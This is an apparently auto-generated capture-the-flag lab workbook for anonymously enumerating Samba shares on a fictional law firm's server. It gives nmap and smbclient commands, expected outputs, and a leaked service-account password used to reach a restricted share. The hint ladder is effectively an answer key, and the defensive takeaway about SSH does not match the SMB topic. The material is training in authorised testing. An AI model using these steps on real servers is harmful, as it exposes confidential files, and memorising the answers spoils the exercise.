# Blackwell & Associates - SMB Share Enumeration

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-2-7-smb-share-enumeration/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Blackwell & Associates - SMB Share Enumeration** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **35 minutes** · Difficulty: **beginner**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Blackwell & Associates is a mid-size law firm in Richmond, Virginia. They
recently migrated their internal file server to a new Linux-based system
running Samba. The IT contractor who set it up assured the managing partner
that "everything is properly locked down."

Your firm has been hired to verify that claim. The scope covers the file
server and all exposed SMB shares. The managing partner, Victoria Blackwell,
wants to know: "Can someone from outside our network access our case files?
Our client confidentiality is everything."

Two assessment tokens have been placed in the shares - one on a public share
and one on a restricted share. Enumerate and retrieve both.

## Your Objectives

- Use SMB enumeration tools to discover available network shares
- Access public shares and identify sensitive information
- Discover credentials through information disclosure
- Access restricted shares using discovered credentials
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SMB port is accessible**

```bash
nmap -p 445 --open <target> 2>&1 | grep -c '445.*open'
```

Expected: `1`

**Enumerate shares with anonymous access**

```bash
smbclient -L //<target> -N 2>&1 | grep -c Disk
```

Expected: `success`

**Access public share and extract token 1**

```bash
smbclient //<target>/general -N -c 'get token.txt /tmp/smb_token1.txt' 2>&1 && cat /tmp/smb_token1.txt
```

Expected: `3num`

**Find leaked credentials in public share**

```bash
smbclient //<target>/general -N -c 'get onboarding_notes.txt /tmp/smb_notes.txt' 2>&1 && grep -o 'Password: [^ ]*' /tmp/smb_notes.txt | awk '{print $2}'
```

Expected: `Bl4ckw3ll_HR#`

**Access restricted share with discovered credentials**

```bash
smbclient //<target>/hr_data -U hr_svc%Bl4ckw3ll_HR# -c 'get assessment_token.txt /tmp/smb_token2.txt' 2>&1 && cat /tmp/smb_token2.txt
```

Expected: `sh4r3d`

**Verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{...}`


### Hint ladder

<details><summary>Hint 1 (unlocks after 8 minutes)</summary>

Start by discovering what SMB shares are available. Use smbclient or
enum4linux: smbclient -L //<target_ip> -N (the -N flag means no password).
Look at which shares allow anonymous/guest access.

</details>

<details><summary>Hint 2 (unlocks after 16 minutes)</summary>

The "general" share allows anonymous access. Connect with:
smbclient //<target_ip>/general -N
Download and read all files - one contains Token 1, another leaks credentials
for the restricted "hr_data" share.

</details>

<details><summary>Hint 3 (unlocks after 22 minutes)</summary>

In the general share, read onboarding_notes.txt for the HR service account
credentials: hr_svc / Bl4ckw3ll_HR#. Then access the restricted share:
smbclient //<target_ip>/hr_data -U hr_svc%Bl4ckw3ll_HR#
Token 2 is in a file on that share.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
